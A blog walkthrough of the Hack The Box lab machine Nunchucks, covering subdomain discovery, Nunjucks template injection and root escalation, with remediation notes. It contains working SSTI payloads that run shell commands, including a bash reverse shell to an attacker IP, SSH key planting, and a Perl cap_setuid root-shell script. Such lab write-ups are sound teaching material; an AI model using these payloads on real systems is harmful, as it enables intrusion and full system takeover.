---
layout: post
title: Hack The Box Walkthrough - Nunchucks
date: 2022-04-19
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/04/HTB/Nunchucks
img: 2022/04/Nunchucks/Nunchucks.png
---

A very fun machine where you need to enumerate subdomains, abuse a SSTI vulnerability, and finally elevate privileges by abusing a program with too much permissions.

* Room: Nunchucks
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Nunchucks](https://app.hackthebox.com/machines/Nunchucks)
* Author: [TheCyberGeek](https://app.hackthebox.com/users/114053)

## Enumeration

I begin the machine be looking for open ports with RustScan. 

```
$ rustscan -a target.htb -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.95.252:22
Open 10.129.95.252:80
Open 10.129.95.252:443
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 19:14 EDT
... 

Scanned at 2022-04-18 19:14:55 EDT for 15s

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCq1JmckuJo2Y9YNiQEI6OM3uM/w5Nb9D6oOZkigNfQ5MY0FzdfAac2tfeV9JekpB0i3QvwaIg8ZFM3qpaVWgCYOwPKXDUdkPaDcjoUGDJKQ+ozI22JsGLhW18LdpZkqhsa9kSwID7hj6PjtJM0e7+t6oQlgbKBpAIfIWai8zcXfIuJpN5VzT9Ix7btb4yZ3DrSs
kDJsFgFpDMN3aDTCsCy2noKDm5mlUlJ7w28Qa6+Ju7JaSdyc0k6ftFQ1PImyLjoOefWp/5UxztBbWk191WJApoOJC0IUOz8kbbkCDEtIh7kwdX65uDJ86L+KGdlCPlB4svIpwhYgkkg7GAJXP9Ti7uZHsrxahbI6LZRLuX1X6guWaq/PPz8tmVfcjY7ggh1nAa+wUgU67X/zTie4J+BiJW3wGvGAiEetUs5fJ/CA/BI
fQAijCVlJ4yGJ95cUmALeiRRYJJpq4BpZTC6RgUQIHr+Yv6wyKuVY9GPwdd2+SEuXG+jjim1SkqtErrlpuk=
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAM6D7HHa0rYKxL/Crh7HeTDHOjrvQGyLngKIOz+M9iLI8+XkEpa0iPsGo4uob5Sj4iKN+QPjYwX2wfDUPb/3PA=
|   256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICav37LXta1VOXvC+x3kcTq8ssxpygmnuLwsPSOw2GA0
80/tcp  open  http     syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
|_http-favicon: Unknown favicon MD5: 4BD6ED13BE03ECBBD7F9FA7BAA036F95
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Issuer: commonName=Nunchucks-CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-30T15:42:24
| Not valid after:  2031-08-28T15:42:24
| MD5:   57fc 410d e809 1ce6 82f9 7bee 4f39 6fe4
| SHA-1: 518c 0fd1 6903 75c0 f26b a6cb e37d 53b8 a3ff 858b
| -----BEGIN CERTIFICATE-----
| MIIDfzCCAmegAwIBAgIUKxAbJZWVom8Q586tlGzfX5kvDOowDQYJKoZIhvcNAQEL
| BQAwJDELMAkGA1UEBhMCVVMxFTATBgNVBAMMDE51bmNodWNrcy1DQTAeFw0yMTA4
| MzAxNTQyMjRaFw0zMTA4MjgxNTQyMjRaMG0xCzAJBgNVBAYTAlVLMQ8wDQYDVQQI
| DAZEb3JzZXQxFDASBgNVBAcMC0JvdXJuZW1vdXRoMR8wHQYDVQQKDBZOdW5jaHVj
| a3MtQ2VydGlmaWNhdGVzMRYwFAYDVQQDDA1udW5jaHVja3MuaHRiMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7f8kUO3+Tg/tliYC6DTdaQMz8kQflhXE
| SFcXtvq0YW7+d83N1eHl1Cofk31roKIloTsWk+WvQfzBnzDT9Jlo2CT/c2Q8pxAD
| rJDvmrRlx5g6lGfB44/YUx1crjka44FPcwWbSUQ3RJznJ8jbD+mVuGXIK36BAd0l
| SYcIYbDwoE+7DTpP5FI+u8usIFyHo8CBllv6eXf2vOSAZ2xfyEG9fKC2fA3QOn9k
| kFQS7jM8QDnfi3El6nz2LkceIR6j4yCBTMP0306Q1h5HxzBRN61vHatbgZBHMuk5
| J6SU17lDk0ZWOAndm8GZ5oqXb1izqCI+br98gmNiDI3O8iXXD+WUXwIDAQABo2Aw
| XjAfBgNVHSMEGDAWgBTGviN/t7q7DX8/lk5dNecH/45EDjAJBgNVHRMEAjAAMAsG
| A1UdDwQEAwIE8DAjBgNVHREEHDAagglsb2NhbGhvc3SCDW51bmNodWNrcy5odGIw
| DQYJKoZIhvcNAQELBQADggEBAFBbtVQXf2UcbXroFdEjCGfjcAH9ftCFtCD8ptBm
| CMD8W/WyFnJ17IVjVoatfZimg5KunneNEHfMpxXe7+YMHY3qxgHmJCeVJA2l04hS
| PTWljwqfaK50zivBs7+TYTccZPz/F83upQsPVdWCIOtH3Qq9A4Ox+dLvIVA+geGH
| Bbp0uZowM3k/rW2nqBaBkpxOlHrahxgUr4Hz9/j4dilw/Y3OUEvegDN9D5Cvh69f
| pQ8UwDx0nqYtCRF/M44LFGlmgjQBZqqijvkCVV4jZRNfPQEeuxd7OnDddgQLwMK1
| DKIK3Eqo7fLLlXqQBQgg6X0UbN9RsWjD8vq1uc2iQDUH9To=
|_-----END CERTIFICATE-----
| tls-nextprotoneg:
|_  http/1.1
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.75 seconds
```

There are three ports opened. 

* 22 - SSH
* 80 - HTTP
* 443 - HTTPS



## Web Sites

From nmap results, we see that http redirect to https://nunchucks.htb/. I added nunchucks.htb to my hosts file and opened a browser to that address.

![Main Site](/assets/images/2022/04/Nunchucks/MainSite.png "Main Site")

I looked around, the site was mostly one static page. There was a login and a register page, but both pages said that it was disabled.

I started enumerating the site with FeroxBuster.

```bash
$ feroxbuster -u https://nunchucks.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.6.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://nunchucks.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.6.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET        3l        6w       45c Got 200 for https://nunchucks.htb/ffa5b292e9244af08c69ab2f46e5707d (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 45 responses; toggle this behavior by using --dont-filter
WLD      GET        3l        6w       45c Got 200 for https://nunchucks.htb/c5e4499ed4fd49289e23bd13a3d45450cc4564765eea47c6af545a47087535144909fb6535924a7693c90f237891c5e6 (url length: 96)
200      GET      546l     2271w    30589c https://nunchucks.htb/
200      GET      183l      662w     9172c https://nunchucks.htb/Login
200      GET      250l     1863w    19134c https://nunchucks.htb/Privacy
301      GET       10l       16w      179c https://nunchucks.htb/assets => /assets/
301      GET       10l       16w      187c https://nunchucks.htb/assets/css => /assets/css/
200      GET      183l      662w     9172c https://nunchucks.htb/login
301      GET       10l       16w      193c https://nunchucks.htb/assets/images => /assets/images/
301      GET       10l       16w      185c https://nunchucks.htb/assets/js => /assets/js/
200      GET      250l     1863w    19134c https://nunchucks.htb/privacy
200      GET      187l      683w     9488c https://nunchucks.htb/signup
200      GET      245l     1737w    17753c https://nunchucks.htb/terms
200      GET      356l     1823w   482985c https://nunchucks.htb/assets/images/favicon.ico
[####################] - 36s    80104/80104   0s      found:14      errors:144
[####################] - 25s     4714/4712    208/s   https://nunchucks.htb/
[####################] - 24s     4712/4712    224/s   https://nunchucks.htb/.git/logs/
[####################] - 28s     4712/4712    187/s   https://nunchucks.htb/assets
[####################] - 29s     4712/4712    180/s   https://nunchucks.htb/assets/.git/logs/
[####################] - 25s     4712/4712    198/s   https://nunchucks.htb/cgi-bin/
[####################] - 25s     4712/4712    191/s   https://nunchucks.htb/.git/logs/cgi-bin/
[####################] - 25s     4712/4712    194/s   https://nunchucks.htb/cgi-bin/.git/logs/
[####################] - 28s     4712/4712    169/s   https://nunchucks.htb/assets/cgi-bin/
[####################] - 27s     4712/4712    182/s   https://nunchucks.htb/assets/css
[####################] - 25s     4712/4712    191/s   https://nunchucks.htb/cgi-bin/cgi-bin/
[####################] - 27s     4712/4712    183/s   https://nunchucks.htb/assets/images
[####################] - 25s     4712/4712    189/s   https://nunchucks.htb/assets/js
[####################] - 25s     4712/4712    189/s   https://nunchucks.htb/assets/css/cgi-bin/
[####################] - 22s     4712/4712    208/s   https://nunchucks.htb/cgi-bin/cgi-bin/cgi-bin/
[####################] - 22s     4712/4712    205/s   https://nunchucks.htb/assets/cgi-bin/cgi-bin/
[####################] - 20s     4712/4712    226/s   https://nunchucks.htb/assets/images/cgi-bin/
[####################] - 20s     4712/4712    232/s   https://nunchucks.htb/assets/js/cgi-bin/
```

It did not find anything interesting. Next I tried enumeration subdomains. 

```bash
$ wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 2271 -H "Host:FUZZ.nunchucks.htb" "https://nunchucks.htb/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nunchucks.htb/
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000081:   200        101 L    259 W      4028 Ch     "store"
000002700:   400        7 L      12 W       166 Ch      "m."
000002795:   400        7 L      12 W       166 Ch      "ns2.cl.bellsouth.net."
000002883:   400        7 L      12 W       166 Ch      "ns1.viviotech.net."
000002885:   400        7 L      12 W       166 Ch      "ns2.viviotech.net."
000003050:   400        7 L      12 W       166 Ch      "ns3.cl.bellsouth.net."
000004083:   400        7 L      12 W       166 Ch      "quatro.oweb.com."
000004082:   400        7 L      12 W       166 Ch      "jordan.fortwayne.com."
000004081:   400        7 L      12 W       166 Ch      "ferrari.fortwayne.com."

Total time: 0
Processed Requests: 5000
Filtered Requests: 4991
Requests/sec.: 0
```

It found a subdomain store.nunchucks.htb. I added that to my hosts file and opened it.

![Store](/assets/images/2022/04/Nunchucks/Store.png "Store")

This site was also simple. It had a form to subscribe to a newsletter. I tried to register, it gave my a message repeating my email. 

![Newsletter](/assets/images/2022/04/Nunchucks/Newsletter.png "Newsletter")

I looked at the request sent in Burp. 

```http
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=vLv8i_9LImTTHu9CArOa0ohH
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 30
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"email":"test@nunchucks.htb"}
```

The email address was sent back in the response. 

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 20 Apr 2022 00:00:54 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 91
Connection: close
X-Powered-By: Express
ETag: W/"5b-zlikhMBR+YEHay4+b3nr6ZWQ36s"

{"response":"You will receive updates on the following email address: test@nunchucks.htb."}
```

I tried using [Server Side Template Injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) (SSTI) on the email. 

```http
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=GF8zEz4oerOlosiTsgNYIpEA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 19
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"email":"{% raw %}{{7*7}}{% endraw %}"}
```

The '7*7' came back as 49. This meant that the code between the {% raw %}{{ }}{% endraw %} was executed by the server.

```http
HTTP/1.1 200 OK
 Server: nginx/1.18.0 (Ubuntu)
 Date: Tue, 19 Apr 2022 00:04:05 GMT
 Content-Type: application/json; charset=utf-8
 Content-Length: 75
 Connection: close
 X-Powered-By: Express
 ETag: W/"4b-X79sUiArPHkUd9eYQd+2RjLRKtA"

 {"response":"You will receive updates on the following email address: 49."}
```

The next thing I needed to do was to identify the templating engine used on the server. The header told be this was running Express, so I looked at Node templating engine in the HackTricks page. I saw one called [NUNJUCKS](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks) so I tested it with the first command injection example. 

```http
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=GF8zEz4oerOlosiTsgNYIpEA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 127
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"email":"{% raw %}{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}{% endraw %}"}
```

The response contained the /etc/password file. 

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 19 Apr 2022 00:12:22 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 744
Connection: close
X-Powered-By: Express
ETag: W/"2e8-J+TpLegq6Ei0sr/u8xxp/hXEqcY"

{"response":"You will receive updates on the following email address: lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nrtkit:x:113:117:RealtimeKit,,,:/proc:/usr/sbin/nologin\ndnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\ngeoclue:x:115:120::/var/lib/geoclue:/usr/sbin/nologin\navahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\ncups-pk-helper:x:117:123:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\nsaned:x:118:124::/var/lib/saned:/usr/sbin/nologin\ncolord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\npulse:x:120:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\nmysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false\n."}
```

Now I launched an netcat listener and used the next example.

```http
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=uGGhErwTbZfNoPOlJSeKno_F
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 167
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"email":"{% raw %}{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/10.10.14.3/4444 0>&1\\\"')\")()}}{% endraw %}"}
```

It gave me a reverse shell on the server, and the first flag.

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.95.252 53838
bash: cannot set terminal process group (1046): Inappropriate ioctl for device
bash: no job control in this shell

david@nunchucks:/var/www/store.nunchucks$ whoami
whoami
david

david@nunchucks:/var/www/store.nunchucks$ cd
cd

david@nunchucks:~$ ls
ls
user.txt

david@nunchucks:~$ cat user.txt
cat user.txt
REDACTED
```

## Getting root

Before I started to look for privilege escalation, I copied my ssh public key to the server so I could connect with ssh instead of the fragile reverse shell. 

```bash
david@nunchucks:~$ mkdir .ssh
mkdir .ssh

david@nunchucks:~$ chmod 700 .ssh
chmod 700 .ssh

david@nunchucks:~$ echo "Public Key" > .ssh/authorized_keys
echo "Public Key" > .ssh/authorized_keys

david@nunchucks:~$ chmod 600 .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
```

```bash
$ ssh david@target
The authenticity of host 'target (10.129.95.252)' can't be established.
ED25519 key fingerprint is SHA256:myGaq8Z7cJOnk/xs1adJsRnqq68uVwnXkj+1KOxXEMI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-86-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 19 Apr 22:31:23 UTC 2022

  System load:             0.0
  Usage of /:              48.9% of 6.82GB
  Memory usage:            47%
  Swap usage:              0%
  Processes:               235
  Users logged in:         0
  IPv4 address for ens160: 10.129.95.252
  IPv6 address for ens160: dead:beef::250:56ff:feb9:b860


10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Oct 22 19:09:52 2021 from 10.10.14.6
```

I looked around for ways to escalate my privileges. I could not run sudo as it required a password and I did not have david's password. I looked for files with the suid bit set and did not find any. 

The code for the Store site contained database credentials. 

```js
// controllers/routes.js
var express = require("express");
var router = express.Router();
const nunjucks = require('nunjucks');
const csrf = require('csurf');
var csrfProtection = csrf({ cookie: true });
const { unflatten } = require('flat');

router.get( '/', csrfProtection, routeHome);

router.use('/assets', express.static('./assets'));

var mysql      = require('mysql');
var connection = mysql.createConnection({
  host     : 'localhost',
  user     : 'newsletter_admin',
  password : 'StoreNLetters2021',
  database : 'newsletters'
});
```
I tried to use the password for david and root, but it did not work. I connected to the database. It only contained a user table. I was hopping it would have a password, but was just the emails of those who subscribed to the newsletter.

```sql
$ mysql -u newsletter_admin -p
Enter password:

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.26-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> Show Databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| newsletters        |
+--------------------+
2 rows in set (0.00 sec)

mysql> use newsletters
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> Show Tables;
+-----------------------+
| Tables_in_newsletters |
+-----------------------+
| users                 |
+-----------------------+
1 row in set (0.00 sec)

mysql> Select * From users;
+----+---------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | email                                                                                                                                                   |
+----+---------------------------------------------------------------------------------------------------------------------------------------------------------+
|  1 | test@nunchucks.htb                                                                                                                                      |
|  2 | {% raw %}{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.122/4444 0>&1\"')")()}}{% endraw %} |
+----+---------------------------------------------------------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

The /opt folder had a backup script. 

```bash
$ ls -la /opt/
total 16
drwxr-xr-x  3 root root 4096 Oct 28 17:03 .
drwxr-xr-x 19 root root 4096 Oct 28 17:03 ..
-rwxr-xr-x  1 root root  838 Sep  1  2021 backup.pl
drwxr-xr-x  2 root root 4096 Oct 28 17:03 web_backups
```

```pl
# backup.pl
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid);
POSIX::setuid(0);

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
```

The script started by changing the user id to 0, which is root, then it made a backup of the web sites. Changing your user id to root like that should not be possible. Unless it's suid bit was set, or some additional [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) were given to the program.

```bash
david@nunchucks:/opt$ getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep
```

Perl was allowed to change the user id. I tried using the existing program. But I could not exploit anything. Then I realised that I could just create a new one. Any perl program had that capabilities, not just backup.pl.

```pl
# test.pl
#!/usr/bin/perl
use strict;
use POSIX qw(setuid);
POSIX::setuid(0);
system("/bin/bash -p");
```

I ran the program and I was root.

```bash
david@nunchucks:/tmp$ ./test.pl

root@nunchucks:/tmp# whoami
root

root@nunchucks:/tmp# cat /root/root.txt
REDACTED
```

## Remeditation

The first issue to mitigate is the SSTI. The documentation has a [warning about not using user-defined content](https://mozilla.github.io/nunjucks/api.html#user-defined-templates-warning). The site code uses the provided email as part of the template. 

```js
var template = 'You will receive updates on the following email address: ' + email + '.';
rendered = nunjucks.renderString(
  str = template
);
return res.json({'response': rendered});
```

The correct way to do that would be to add a placeholder for the email in the template, then pass the email in the context. The templating engine should escape it correctly.

The other issue with the machine was allowing Perl to set the user id. This meant that any perl code could do it. So any user could become root. Using capabilities like that is a bad idea. If root permissions are needed to run the backup, then root should execute. Maybe through a cron. 
